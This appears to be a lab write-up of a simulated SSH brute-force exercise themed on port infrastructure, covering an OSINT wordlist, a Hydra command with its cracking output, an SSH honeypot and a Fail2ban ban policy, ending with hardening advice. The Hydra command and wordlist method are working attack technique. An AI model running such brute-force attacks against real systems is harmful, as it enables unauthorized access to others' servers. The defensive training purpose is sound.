# Simulation 2 — SSH Brute Force, Honeypot & Fail2ban

**Phase 2 · Initial access**

## Results

| Metric | Value |
|---|---|
| Attempts to crack password | 4 |
| Honeypot captures | 47 |
| Time to crack | < 4 min |
| Fail2ban version | 1.1.0 |

## Step A — OSINT Wordlist

Built from Tanger Med public data (website, LinkedIn, maritime terminology). See [`tangermed_wordlist.txt`](../wordlists/tangermed_wordlist.txt). The real password landed at rank #4 vs #2,847,563 in rockyou.txt — proof that context beats volume.

## Step B — Hydra Attack

```bash
hydra -l portuser -P ../wordlists/tangermed_wordlist.txt ssh://192.168.64.2 -t 4 -V
```

```
[ATTEMPT] login: portuser  pass: tangermed2023   -> FAILED
[ATTEMPT] login: portuser  pass: portadmin       -> FAILED
[ATTEMPT] login: portuser  pass: scada2024       -> FAILED
[ATTEMPT] login: portuser  pass: tangermed2024   -> SUCCESS
[22][ssh] host: 192.168.64.2  login: portuser  password: tangermed2024
```

## Step C — SSH Honeypot (Paramiko)

Full script: [`ssh_honeypot.py`](ssh_honeypot.py). Listens on port 2222, mimics a real SSH handshake, never grants access. **47 credentials captured** across 3 attack waves (see [`honeypot.log`](honeypot_sample.log)).

```bash
sudo python3 ssh_honeypot.py
```

## Step D — Fail2ban Progressive Banning

Config: [`jail.local`](jail.local).

```ini
[sshd]
enabled          = true
port             = ssh
maxretry         = 3
bantime          = 60
bantime.multiplier = 2
bantime.maxtime  = 86400
```

```bash
ssh portuser@192.168.64.2
# ssh: connect to host 192.168.64.2 port 22: Connection refused  <- banned
```

| Ban # | Trigger | Duration |
|---|---|---|
| 1 | 3 failures in 60s | 1 min |
| 2 | Returns after ban | 2 min (×2) |
| 3 | Returns again | 4 min (×2) |
| max | — | 86400s (24h cap) |

## 🔵 Blue Team Lesson

Password-based SSH is fundamentally weak in critical infrastructure. The real fix is SSH key authentication (RSA 4096 / Ed25519) with `PasswordAuthentication no`, plus mandatory MFA.
